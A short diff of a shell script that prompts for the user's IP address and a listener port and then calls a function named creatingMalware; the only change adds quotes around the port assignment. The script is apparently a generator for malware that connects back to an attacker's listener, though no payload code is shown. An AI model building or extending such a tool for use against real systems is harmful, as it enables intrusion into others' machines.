@@ -4,7 +4,7 @@ grepIP() {
     default_port=8000
     read -p "Type Your IP address: " host
     read -p "Type your Listener Port[Default: 8000]: " port
-    port=${port:-${default_port}}
+    port="${port:-${default_port}}"
     creatingMalware
 }
 creatingMalware() {
